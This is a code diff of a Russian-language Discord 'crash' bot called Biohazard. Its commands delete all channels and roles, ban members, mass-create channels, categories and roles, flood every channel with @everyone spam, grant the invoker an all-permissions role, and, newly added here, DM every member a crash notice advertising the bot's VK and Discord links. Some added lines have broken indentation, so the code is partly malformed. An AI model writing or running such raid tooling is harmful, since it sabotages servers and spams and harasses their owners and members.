@@ -7,13 +7,14 @@ print('Ожидание входа...')
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.1'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.2'))
 		
 	async def on_message(self, message):
 		c = 0
 		r = 0
 		m = 0
-		print('{0.author} с сервера {0.guild.name} сказал: {0.content}'.format(message))
+		s = 0
+		print('{0.author} с сервера {0.guild.name} и канала {0.channel.name} сказал: {0.content}'.format(message))
 		if message.content == '*помощь': #помощь
 			await message.delete()
 			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
@@ -23,6 +24,7 @@ class MyClient(discord.Client):
 			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
 			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
 			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
+			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
 			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
 			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
@@ -66,22 +68,26 @@ class MyClient(discord.Client):
 						pass
 				await message.author.send('**:hammer: Участников забанено: **' + str(m))
 				
-				await asyncio.sleep(0.1)
-				try:
-					while True: #бесконечный цикл
+				while s <= 500: #бесконечный цикл
+					for i in message.guild.text_channels:
+					await asyncio.sleep(0.1)
+					try:
+						await i.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC')
 						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
 						await message.guild.create_category('Crash by Biohazard') #создание категории
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
-				except:
-					pass
+						s = s + 1
+					except:
+						pass
 				
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
 				await message.delete()
-				while True:
+				while s <= 500:
             				for channel in message.guild.text_channels:
                 				await channel.send(spam)
+						s = s + 1
 					
 						
 				
@@ -202,7 +208,11 @@ class MyClient(discord.Client):
 			if message.content == '*админка': #выдаёт админку
 				await message.delete()
 				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
-				await client.add_roles(message.author, role)
+				
+			if message.content == '*лс':
+				await message.delete()
+				for i in message.guild.members:
+					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC')
 					
 
 client = MyClient()
